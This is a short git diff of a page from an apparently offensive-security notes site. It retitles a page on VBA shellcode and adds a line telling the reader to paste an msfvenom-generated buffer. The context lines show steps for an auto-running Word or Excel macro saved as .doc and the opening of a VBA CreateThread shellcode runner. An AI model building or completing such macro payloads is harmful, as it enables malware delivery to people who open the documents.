@@ -1,8 +1,8 @@
 ---
-title: VBA Shellcode
+title: Office (VBA)
 layout: default
-parent: Client Side Execution
-nav_order: 3
+parent: Shellcode
+nav_order: 1
 ---
 
 The theory is always to:
@@ -26,6 +26,7 @@ Next in Microsoft Word do this:
 * Name the macro AutoOpen (If you change this you need to change multiple references below)
 * Save the document as \*.doc (\*.docx will not run macro)
 * Change function name for Excel. For example, Document_Open() is called Workbook_Open() in Excel
+* Replace the whole `buf` from msfvenom below.
 
 ```vb
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
@@ -85,6 +86,7 @@ Next in Microsoft Word do this:
 * Name the macro AutoOpen (If you change this you need to change multiple references below)
 * Save the document as \*.doc (\*.docx will not run macro)
 * Change function name for Excel. For example, Document_Open() is called Workbook_Open() in Excel
+* Replace the whole `buf` from msfvenom below.
 
 ```vb
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
